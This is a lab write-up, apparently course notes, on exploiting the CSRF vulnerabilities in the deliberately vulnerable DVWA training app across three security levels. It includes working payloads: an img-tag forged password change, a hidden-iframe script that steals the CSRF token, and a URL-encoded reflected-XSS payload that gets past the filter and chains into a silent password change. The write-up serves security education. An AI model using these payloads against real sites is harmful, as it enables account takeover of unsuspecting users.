# Cross-site request forgery vulnerabilities in DVWA

Our goal is to exploit the vulnerabilities in the **CSRF** category of `dvwa`. We want to create a website that, if the user visits, will change their password to the current security level without their knowledge or permission.

*Security Level: low*

To first figure out how to perform a CSRF attack, we need to see how the password is actually changed. In our network view, we see the following GET request is made:
```
http://10.6.66.42/dvwa/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change
```

This matches the PHP code:
```PHP
if( isset( $_GET[ 'Change' ] ) ) {
// Get input
$pass_new  = $_GET[ 'password_new' ];
$pass_conf = $_GET[ 'password_conf' ];
}
```
If all of these fields are set correctly, the password is updated.

This means that our evil website simply needs to send the appropriate get request to the dvwa endpoint, and if the user is authenticated, it should change the password.

My first instinct was to use the `fetch()` function like in tutorial 7. However, when looking at the network view when loading our [evil webpage](low.html), we get a 302 error with a CORS Missing Allow Origin. This essentially means that `dvwa`'s response doesn't have the required `Access-Control-Allow-Origin` header, which is used to determine whether or not the resource can be accessed by content operating within the current region. However, if you access the url above using the `src` attribute, we don't get this error. This is becauses the corss-origin sharing standard does not include [`img` tags](https://stackoverflow.com/questions/47978252/how-img-tag-gets-content-over-cors-headers).

After opening up the payload in our browser, when we try to log back in we can see that the password has changed.

*Security Level: medium*

In this level, the following check has been added:
```PHP
// Checks to see where the request came from
if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ])!=-1 )
```
`stripos` returns the position where the name of the server host under which the current script is executing (`$_SERVER[ 'SERVER_NAME' ]`) exists inside the address of the page (if any) which referred the user agent to the current page (`$_SERVER[ 'HTTP_REFERER' ]`). If the `HTTP_REFERER` is not found, the function returns `false`. The issue is that the webpage checks that the result `!= -1`. This means that even if the string is not found, the check returns true since `false != -1` returns `true`.

This means that this difficulty is effectively the same as the previous level, and the exact same payyload can be used.

*Security Level: high*

In this level, the following check is used instead:
```PHP
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
```
The `checkToken` function seems to be one that is locally defined somehwere. After trying the same payload for medium, I was redirected to `index.php`, which leads me to believe that this function essentially checks that the `user_token` in the GET request matches the `session_token`, and if they don't you are redirected to `index.php`. We essentially need to get the `session_token`, which seems to be created by `generateSessionToken();` at the bottom of the PHP script. If we check the source code for the webpage, we can see that the `user_token` is actually embedded in the webpage:
```html
<input type="hidden" name="user_token" value="ede42a723132328bf807ab0596238d7a">
```
We therefore need a way to get the the token from the webpage, then include it in our GET request to change the username. As seen in the *low* category, we are unable to make requests to `dvwa` directly. However, we can load the page in an `<iframe>`, which we can then examine for the CSRF token:
```html
<iframe id="csrf_vuln" src="http://10.6.66.42/dvwa/vulnerabilities/csrf/" style="visibility: hidden;" onload="payload()">
</iframe>
<script>
function payload() {
  var iframe = document.getElementById('csrf_vuln'); // Gets the iframe from the DOM
  var doc = iframe.contentWindow.document; // Gets the content inside the iframe
  var token = doc.getElementsByName('user_token')[0].value; // Gets all elements with the name "user_token", looks at the first one and takes its value field

  const http = new XMLHttpRequest();
  const url = 'http://10.6.66.42/dvwa/vulnerabilities/csrf/?password_new=high&password_conf=high&Change=Change&user_token='+token; // Embed token in our request
  http.open('GET', url);
  http.send(); // Send request
}
</script>
```
The HTML code above does exactly this, loading the webpage into a hidden `<iframe>` and ef we xecuting a payload. However, if we try opening this file in our browser ([high_payload.html](high_payload.html)), we notice the following error in our console:
```
Uncaught DOMException: Permission denied to access property "document" on cross-origin object
```
Essentially, since our page has a different origin to `dvwa`, we cannot access the the content inside the iframe (the `doc` variable), meaning that in order for this to work this must be done from dvwa's origin. There are 2 ways (that I could think of) to do this:
- Upload the malicious website to `dvwa` through the **file upload** vulnerability, and redirect users who visit our malicious webpage to it.
- Exploit the **XSS (reflected)** vulnerability by encoding the payload inside the URL, and make our webpage fetch this vulnerable url.

I opted for the second option, since I couldn't be bothered to figure out how to upload an html file on *high* difficulty (and it felt like cheating to lower the difficulty to upload the file). Also, using XSS is more elegant in my opinion since it only requries 1 website. To perform this XSS attack, I needed to rewrite my payload in a format where it would pass the filters on the *high* difficulty:
```html
<iframe id="csrf_vuln" src="http://10.6.66.42/dvwa/vulnerabilities/csrf/" style="visibility: hidden;" onload="var iframe = document.getElementById('csrf_vuln'); var doc = iframe.contentWindow.document; var token = doc.getElementsByName('user_token')[0].value; const http = new XMLHttpRequest(); const url = 'http://10.6.66.42/dvwa/vulnerabilities/csrf/?password_new=high&password_conf=high&Change=Change&user_token='+token; http.open('GET', url); http.send();"></iframe>
```
Like in [tutorial 7](../tutorial_7/notes.md), I needed to add a line break in the url encoding of the payload to stop it from being filtered by the regex. Once this was done, our payload was ready:
```
http://10.6.66.42/dvwa/vulnerabilities/xss_r/?name=%3Ciframe+id%3D%22csrf_vuln%22+src%3D%22http%3A%2F%2F10.6.66.42%2Fdvwa%2Fvulnerabilities%2Fcsrf%2F%22+style%3D%22visibility%3A+hidden%3B%22+onload%3D%22var+iframe+%3D+document.getElementById(%27csrf_vuln%27)%3B%0A+var+doc+%3D+iframe.contentWindow.document%3B+var+token+%3D+doc.getElementsByName(%27user_token%27)%5B0%5D.value%3B+const+http+%3D+new+XMLHttpRequest()%3B+const+url+%3D+%27http%3A%2F%2F10.6.66.42%2Fdvwa%2Fvulnerabilities%2Fcsrf%2F%3Fpassword_new%3Dhigh%26password_conf%3Dhigh%26Change%3DChange%26user_token%3D%27%2Btoken%3B+http.open(%27GET%27%2C+url)%3B+http.send()%3B%22%3E%3C%2Fiframe%3E
```
I first tested this by opening this link in a new tab, which caused my password to be changed. Now, all we need to do is ensure that our malicious webpage accesses this link, so I created a hidden `<iframe>` which performs the GET request to our payload url:
```html
<iframe src="http://10.6.66.42/dvwa/vulnerabilities/xss_r/?name=%3Ciframe+id%3D%22csrf_vuln%22+src%3D%22http%3A%2F%2F10.6.66.42%2Fdvwa%2Fvulnerabilities%2Fcsrf%2F%22+style%3D%22visibility%3A+hidden%3B%22+onload%3D%22var+iframe+%3D+document.getElementById(%27csrf_vuln%27)%3B%0A+var+doc+%3D+iframe.contentWindow.document%3B+var+token+%3D+doc.getElementsByName(%27user_token%27)%5B0%5D.value%3B+const+http+%3D+new+XMLHttpRequest()%3B+const+url+%3D+%27http%3A%2F%2F10.6.66.42%2Fdvwa%2Fvulnerabilities%2Fcsrf%2F%3Fpassword_new%3Dhigh%26password_conf%3Dhigh%26Change%3DChange%26user_token%3D%27%2Btoken%3B+http.open(%27GET%27%2C+url)%3B+http.send()%3B%22%3E%3C%2Fiframe%3E", style="visibility: hidden;">
</iframe>
```
Another option is to redirect our user to the payload url using a `<meta>` tag in the header, but this means that the user can see that they've been redirected, which might be a little *sus*. If we now open our [evil webpage](high.html), all the relevent network requests are made, with our XXS attack triggering a CSRF attack which sets the user's password to 'high'! 
